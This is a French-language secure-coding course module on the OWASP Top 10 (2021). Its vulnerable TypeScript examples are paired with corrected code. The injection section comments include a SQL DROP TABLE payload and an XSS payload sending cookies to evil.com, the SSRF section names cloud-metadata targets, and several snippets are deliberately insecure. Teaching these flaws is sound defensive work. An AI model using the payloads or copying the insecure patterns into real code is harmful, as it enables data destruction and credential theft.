# Module 1 — OWASP Top 10 (2021)

## Objectifs pédagogiques

- Connaître l'OWASP et son rôle dans la sécurité applicative
- Maîtriser chaque catégorie du Top 10 2021
- Savoir identifier et prévenir chaque type de vulnérabilité
- Appliquer ces connaissances dans des projets JavaScript/TypeScript

---

## 1. Qu'est-ce que l'OWASP ?

L'**OWASP** (Open Web Application Security Project) est une fondation à but non lucratif qui travaille à améliorer la sécurité des logiciels. Son projet phare est le **Top 10**, une liste des dix risques de sécurité les plus critiques pour les applications web, mise à jour tous les 3-4 ans.

### Évolution du Top 10

Le Top 10 2021 a intégré de nouvelles catégories reflétant l'évolution des menaces :

```
2017                              2021
─────────────────────────────     ──────────────────────────────
A1: Injection                  →  A03: Injection (↓)
A2: Broken Authentication      →  A07: Auth Failures (↓)
A3: Sensitive Data Exposure     →  A02: Crypto Failures (↑)
A4: XXE                        →  (fusionné dans A05)
A5: Broken Access Control       →  A01: Broken Access Control (↑↑)
A6: Security Misconfiguration   →  A05: Security Misconfig (↓)
A7: XSS                        →  (fusionné dans A03)
A8: Insecure Deserialization   →  A08: Integrity Failures
A9: Known Vulnerabilities       →  A06: Vulnerable Components (↑)
A10: Logging & Monitoring      →  A09: Logging Failures (↓)
                                   A04: Insecure Design (NOUVEAU)
                                   A10: SSRF (NOUVEAU)
```

---

## A01 — Broken Access Control

### Description

Le contrôle d'accès applique les politiques qui déterminent ce qu'un utilisateur peut faire. Quand il est défaillant, des utilisateurs peuvent accéder à des ressources non autorisées.

**Montée de la 5ᵉ à la 1ʳᵉ place** — c'est la vulnérabilité la plus répandue.

### Exemple vulnérable

```typescript
// ❌ IDOR (Insecure Direct Object Reference)
// N'importe quel utilisateur authentifié peut accéder aux données d'un autre
app.get('/api/users/:id/invoices', authenticateJWT, async (req, res) => {
  const invoices = await db.query(
    'SELECT * FROM invoices WHERE user_id = $1',
    [req.params.id] // Pas de vérification que c'est le bon utilisateur
  );
  res.json(invoices);
});
```

### Correction

```typescript
// ✅ Vérifier que l'utilisateur accède à ses propres données
app.get('/api/users/:id/invoices', authenticateJWT, async (req, res) => {
  if (req.user.id !== parseInt(req.params.id) && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Accès interdit' });
  }
  const invoices = await db.query(
    'SELECT * FROM invoices WHERE user_id = $1',
    [req.params.id]
  );
  res.json(invoices);
});
```

### Prévention

- Refuser par défaut (deny by default), sauf pour les ressources publiques
- Vérifier l'autorisation côté serveur systématiquement
- Utiliser des identifiants indirects (UUID plutôt que ID auto-incrémenté)
- Désactiver le directory listing sur le serveur web
- Logger les échecs de contrôle d'accès et alerter les administrateurs

---

## A02 — Cryptographic Failures

### Description

Anciennement « Sensitive Data Exposure ». Cette catégorie concerne les échecs liés à la cryptographie qui mènent à l'exposition de données sensibles.

### Exemple vulnérable

```typescript
// ❌ Stockage de mot de passe en clair ou avec un hash faible
import crypto from 'node:crypto';

function hashPassword(password: string): string {
  return crypto.createHash('md5').update(password).digest('hex');
  // MD5 n'est pas adapté au hashing de mots de passe
}

// ❌ Données sensibles transmises sans chiffrement
// HTTP au lieu de HTTPS

// ❌ Clé de chiffrement hardcodée
const SECRET_KEY = 'ma-super-cle-secrete-123';
```

### Correction

```typescript
// ✅ Utiliser bcrypt ou argon2 pour les mots de passe
import bcrypt from 'bcrypt';

async function hashPassword(password: string): Promise<string> {
  return bcrypt.hash(password, 12); // cost factor de 12
}

async function verifyPassword(password: string, hash: string): Promise<boolean> {
  return bcrypt.compare(password, hash);
}

// ✅ Clés depuis les variables d'environnement
const SECRET_KEY = process.env.ENCRYPTION_KEY;
if (!SECRET_KEY) throw new Error('ENCRYPTION_KEY non définie');
```

### Prévention

- Classifier les données traitées (données personnelles, données sensibles, etc.)
- Ne pas stocker de données sensibles inutilement
- Chiffrer les données sensibles au repos (AES-256-GCM)
- Imposer HTTPS partout avec HSTS
- Utiliser des algorithmes modernes et éprouvés
- Gérer les clés correctement (rotation, stockage sécurisé)

---

## A03 — Injection

### Description

L'injection se produit quand des données non fiables sont envoyées à un interpréteur dans le cadre d'une commande ou d'une requête. Inclut SQL injection, XSS, command injection, etc.

### Exemple vulnérable

```typescript
// ❌ SQL Injection
app.get('/api/search', async (req, res) => {
  const query = `SELECT * FROM products WHERE name LIKE '%${req.query.q}%'`;
  const results = await db.query(query);
  // Si q = "'; DROP TABLE products; --", la table est supprimée
  res.json(results);
});

// ❌ XSS (Cross-Site Scripting)
app.get('/search', (req, res) => {
  res.send(`<h1>Résultats pour : ${req.query.q}</h1>`);
  // Si q = "<script>document.location='https://evil.com/steal?c='+document.cookie</script>"
});
```

### Correction

```typescript
// ✅ Requêtes paramétrées
app.get('/api/search', async (req, res) => {
  const results = await db.query(
    'SELECT * FROM products WHERE name LIKE $1',
    [`%${req.query.q}%`]
  );
  res.json(results);
});

// ✅ Échappement automatique avec un framework de templating
// ou utilisation de bibliothèques de sanitization
import DOMPurify from 'isomorphic-dompurify';
const safeHTML = DOMPurify.sanitize(userInput);
```

### Prévention

- Utiliser des requêtes paramétrées ou un ORM
- Valider et sanitizer toutes les entrées utilisateur
- Échapper les sorties selon le contexte (HTML, URL, JS, CSS, SQL)
- Utiliser des Content Security Policy (CSP) contre XSS
- Voir le **Module 02** pour un traitement approfondi

---

## A04 — Insecure Design

### Description

**Nouvelle catégorie en 2021.** Se concentre sur les risques liés à des défauts de conception et d'architecture, plutôt qu'à des erreurs d'implémentation. Aucune implémentation parfaite ne peut corriger un design fondamentalement non sécurisé.

### Exemple de design non sécurisé

```typescript
// ❌ Design non sécurisé : récupération de mot de passe basée sur des questions
// "Quel est le nom de votre premier animal ?" — facilement trouvable sur les réseaux sociaux
app.post('/api/reset-password', async (req, res) => {
  const { email, securityAnswer, newPassword } = req.body;
  const user = await findUser(email);
  if (user.securityAnswer === securityAnswer) {
    await updatePassword(user.id, newPassword);
    return res.json({ message: 'Mot de passe mis à jour' });
  }
  // Pas de rate limiting, pas de notification, pas de 2FA
});
```

### Design sécurisé

```typescript
// ✅ Design sécurisé : token temporaire envoyé par email
app.post('/api/forgot-password', rateLimiter, async (req, res) => {
  const { email } = req.body;
  const user = await findUser(email);
  if (user) {
    const token = crypto.randomBytes(32).toString('hex');
    await saveResetToken(user.id, token, Date.now() + 3600_000); // expire 1h
    await sendResetEmail(email, token);
  }
  // Toujours répondre pareil pour ne pas révéler si l'email existe
  res.json({ message: 'Si un compte existe, un email a été envoyé' });
});
```

### Prévention

- Intégrer le threat modeling dès la phase de conception
- Établir un cycle de développement sécurisé (Secure SDLC)
- Utiliser des design patterns sécurisés éprouvés
- Limiter la consommation de ressources par utilisateur/service
- Séparer les couches (tiers architecture) avec des contrôles entre chaque couche

---

## A05 — Security Misconfiguration

### Description

L'application est vulnérable si elle est mal configurée au niveau de la stack applicative : serveur, framework, base de données, cloud, etc.

### Exemple vulnérable

```typescript
// ❌ Headers de sécurité manquants
const app = express();

// ❌ Stack trace exposée en production
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack, // Fuite d'information interne
  });
});

// ❌ CORS trop permissif
app.use(cors({ origin: '*' }));

// ❌ Credentials par défaut non changées
// MongoDB sans authentification, Redis sans mot de passe
```

### Correction

```typescript
import helmet from 'helmet';

const app = express();

// ✅ Helmet ajoute automatiquement les headers de sécurité
app.use(helmet());

// ✅ Gestion d'erreur qui ne fuit pas d'information
app.use((err, req, res, next) => {
  console.error(err); // Logger côté serveur uniquement
  res.status(500).json({ error: 'Erreur interne du serveur' });
});

// ✅ CORS restrictif
app.use(cors({
  origin: ['https://monapp.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  credentials: true,
}));
```

### Prévention

- Processus de hardening reproductible et automatisé
- Pas de fonctionnalités inutiles installées (surface d'attaque minimale)
- Revue régulière des configurations (cloud, serveur, framework)
- Architecture segmentée avec séparation des environnements
- Envoi automatique de directives de sécurité et headers

---

## A06 — Vulnerable and Outdated Components

### Description

Utiliser des composants (librairies, frameworks) avec des vulnérabilités connues. C'est une cible facile car les exploits sont souvent publics.

### Détection

```bash
# Vérifier les vulnérabilités des dépendances npm
npm audit

# Exemple de sortie
# found 3 vulnerabilities (1 low, 1 moderate, 1 critical)
#   critical: prototype-pollution in lodash <4.17.21

# Corriger automatiquement quand possible
npm audit fix
```

### Bonnes pratiques

```json
// package.json — utiliser des ranges de version strictes
{
  "dependencies": {
    "express": "^4.21.0",
    "helmet": "^7.1.0"
  },
  "overrides": {
    "semver": ">=7.5.4"
  }
}
```

### Prévention

- Inventorier toutes les dépendances (SBOM — Software Bill of Materials)
- Supprimer les dépendances inutilisées
- Surveiller en continu les CVE (Dependabot, Snyk, Socket)
- Automatiser les mises à jour avec des PR automatiques
- Préférer des composants activement maintenus et largement adoptés
- Tester les mises à jour dans un pipeline CI avant le merge

---

## A07 — Identification and Authentication Failures

### Description

Faiblesses dans les mécanismes d'authentification permettant à un attaquant d'usurper l'identité d'un utilisateur légitime.

### Exemples de failles

```typescript
// ❌ Pas de protection contre le brute force
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await findUser(email);
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    return res.status(401).json({ error: 'Email ou mot de passe incorrect' });
    // Message générique — bien. Mais pas de rate limiting — mal.
  }
  const token = generateJWT(user);
  res.json({ token });
});
```

### Correction

```typescript
import rateLimit from 'express-rate-limit';

// ✅ Rate limiting sur le login
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: { error: 'Trop de tentatives, réessayez dans 15 minutes' },
  standardHeaders: true,
  keyGenerator: (req) => req.body.email || req.ip, // Par email OU par IP
});

app.post('/api/login', loginLimiter, async (req, res) => {
  const { email, password } = req.body;
  const user = await findUser(email);
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    return res.status(401).json({ error: 'Identifiants invalides' });
  }
  // ✅ Vérifier le MFA si activé
  if (user.mfaEnabled) {
    return res.json({ requireMFA: true, tempToken: generateTempToken(user) });
  }
  const token = generateJWT(user);
  res.json({ token });
});
```

### Prévention

- Implémenter le MFA (authentification multi-facteurs)
- Ne pas livrer avec des credentials par défaut
- Vérifier la force des mots de passe (longueur minimale 12 caractères)
- Limiter les tentatives de connexion (rate limiting, account lockout temporaire)
- Utiliser un gestionnaire de sessions sécurisé côté serveur
- Voir le **Module 03** pour un traitement approfondi

---

## A08 — Software and Data Integrity Failures

### Description

Le code et l'infrastructure ne protègent pas contre les violations d'intégrité. Inclut les mises à jour logicielles non vérifiées, les pipelines CI/CD non sécurisés, et la désérialisation non sécurisée.

### Exemple vulnérable

```typescript
// ❌ Désérialisation non sécurisée
import { deserialize } from 'node-serialize';

app.post('/api/data', (req, res) => {
  const obj = deserialize(req.body.payload);
  // Un payload malicieux peut exécuter du code arbitraire
  res.json(obj);
});

// ❌ Charger des scripts depuis des CDN sans vérification d'intégrité
// <script src="https://cdn.example.com/lib.js"></script>
```

### Correction

```html
<!-- ✅ Subresource Integrity (SRI) pour les scripts externes -->
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
  crossorigin="anonymous"
></script>
```

```typescript
// ✅ Vérifier l'intégrité des données avec des signatures
import crypto from 'node:crypto';

function verifyWebhookSignature(
  payload: string,
  signature: string,
  secret: string
): boolean {
  const expected = crypto
    .createHmac('sha256', secret)
    .update(payload)
    .digest('hex');
  return crypto.timingSafeEqual(
    Buffer.from(signature),
    Buffer.from(expected)
  );
}
```

### Prévention

- Vérifier les signatures numériques des dépendances et mises à jour
- Utiliser Subresource Integrity (SRI) pour les ressources CDN
- Sécuriser le pipeline CI/CD (accès restreint, audit trail)
- Ne pas désérialiser de données non fiables
- Utiliser `npm ci` au lieu de `npm install` en CI pour des builds reproductibles

---

## A09 — Security Logging and Monitoring Failures

### Description

Sans logging et monitoring adéquats, les attaques ne sont pas détectées. Le temps moyen de détection d'une brèche est de 204 jours — un logging efficace réduit ce délai.

### Exemple insuffisant

```typescript
// ❌ Pas de logging des événements de sécurité
app.post('/api/login', async (req, res) => {
  const user = await authenticate(req.body);
  if (!user) return res.status(401).json({ error: 'Unauthorized' });
  // Aucun log de la tentative échouée
  res.json({ token: generateJWT(user) });
});
```

### Correction

```typescript
import winston from 'winston';

const securityLogger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  defaultMeta: { service: 'auth-service' },
  transports: [
    new winston.transports.File({ filename: 'security.log' }),
  ],
});

app.post('/api/login', async (req, res) => {
  const { email } = req.body;
  const user = await authenticate(req.body);

  if (!user) {
    // ✅ Logger les échecs d'authentification
    securityLogger.warn('Login failed', {
      email,
      ip: req.ip,
      userAgent: req.get('user-agent'),
      timestamp: new Date().toISOString(),
    });
    return res.status(401).json({ error: 'Unauthorized' });
  }

  // ✅ Logger les connexions réussies aussi
  securityLogger.info('Login successful', {
    userId: user.id,
    ip: req.ip,
    timestamp: new Date().toISOString(),
  });

  res.json({ token: generateJWT(user) });
});
```

### Prévention

- Logger les événements de sécurité : login, échecs d'auth, accès refusés, erreurs
- Format structuré (JSON) pour faciliter l'analyse automatisée
- Centraliser les logs (ELK Stack, Datadog, Grafana Loki)
- Mettre en place des alertes sur les événements critiques
- Protéger les logs contre la falsification (append-only, signatures)
- Ne **jamais** logger de données sensibles (mots de passe, tokens, numéros de carte)

---

## A10 — Server-Side Request Forgery (SSRF)

### Description

**Nouvelle catégorie en 2021.** L'application effectue des requêtes HTTP vers une URL fournie par l'utilisateur sans validation suffisante, permettant à l'attaquant d'accéder à des ressources internes.

### Exemple vulnérable

```typescript
// ❌ SSRF — l'utilisateur contrôle l'URL de la requête
import axios from 'axios';

app.post('/api/fetch-url', async (req, res) => {
  const { url } = req.body;
  const response = await axios.get(url);
  // L'attaquant peut fournir : http://169.254.169.254/latest/meta-data/
  // pour accéder aux métadonnées AWS EC2
  // Ou : http://localhost:6379/ pour interagir avec Redis
  res.json(response.data);
});
```

### Correction

```typescript
import { URL } from 'node:url';
import dns from 'node:dns/promises';

// ✅ Validation stricte de l'URL
async function isUrlSafe(urlString: string): Promise<boolean> {
  try {
    const url = new URL(urlString);

    // N'autoriser que HTTPS
    if (url.protocol !== 'https:') return false;

    // Bloquer les IP privées et localhost
    const addresses = await dns.resolve4(url.hostname);
    for (const addr of addresses) {
      if (
        addr.startsWith('10.') ||
        addr.startsWith('172.16.') ||
        addr.startsWith('192.168.') ||
        addr.startsWith('127.') ||
        addr === '0.0.0.0' ||
        addr.startsWith('169.254.')
      ) {
        return false;
      }
    }

    // Whitelist de domaines autorisés (encore mieux)
    const allowedDomains = ['api.example.com', 'cdn.example.com'];
    if (!allowedDomains.includes(url.hostname)) return false;

    return true;
  } catch {
    return false;
  }
}

app.post('/api/fetch-url', async (req, res) => {
  const { url } = req.body;
  if (!await isUrlSafe(url)) {
    return res.status(400).json({ error: 'URL non autorisée' });
  }
  const response = await axios.get(url, { timeout: 5000, maxRedirects: 0 });
  res.json(response.data);
});
```

### Prévention

- Valider et sanitizer toutes les URLs fournies par l'utilisateur
- Utiliser une whitelist de domaines/IP autorisés
- Bloquer l'accès aux plages d'IP privées et aux métadonnées cloud
- Désactiver les redirections HTTP (ou les limiter)
- Segmenter le réseau pour limiter l'impact d'un SSRF
- Utiliser un proxy dédié pour les requêtes sortantes

---

## Matrice de risque et priorisation

### Évaluation du risque

Le risque se calcule ainsi :

$$\text{Risque} = \text{Probabilité} \times \text{Impact}$$

### Priorisation recommandée

| Priorité | Catégorie | Justification |
|---|---|---|
| 🔴 Critique | A01 Broken Access Control | La plus répandue, impact direct |
| 🔴 Critique | A03 Injection | Peut mener à la compromission totale |
| 🟠 Haute | A02 Cryptographic Failures | Exposition potentielle de données sensibles |
| 🟠 Haute | A07 Auth Failures | Usurpation d'identité |
| 🟡 Moyenne | A08 Integrity Failures | Supply chain attacks en hausse |
| 🟡 Moyenne | A05 Security Misconfiguration | Facile à corriger, souvent négligé |
| 🟡 Moyenne | A06 Vulnerable Components | Large surface d'attaque |
| 🟡 Moyenne | A10 SSRF | Critique dans le cloud |
| 🔵 Base | A04 Insecure Design | Le plus difficile à corriger |
| 🔵 Base | A09 Logging Failures | Nécessaire pour détecter les autres |

---

## Résumé

Le Top 10 OWASP 2021 reflète l'évolution des menaces web modernes. Les tendances clés :

1. **Broken Access Control** est devenu le risque n°1
2. **Insecure Design** reconnaît l'importance du design sécurisé
3. **SSRF** a gagné sa propre catégorie avec l'essor du cloud
4. **L'injection** reste un classique mais descend grâce aux frameworks modernes

> La connaissance du Top 10 est un minimum. C'est un point de départ, pas une checklist exhaustive de sécurité.

---

## Pour aller plus loin

- [OWASP Top 10 — 2021 (officiel)](https://owasp.org/Top10/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP ASVS (Application Security Verification Standard)](https://owasp.org/www-project-application-security-verification-standard/)
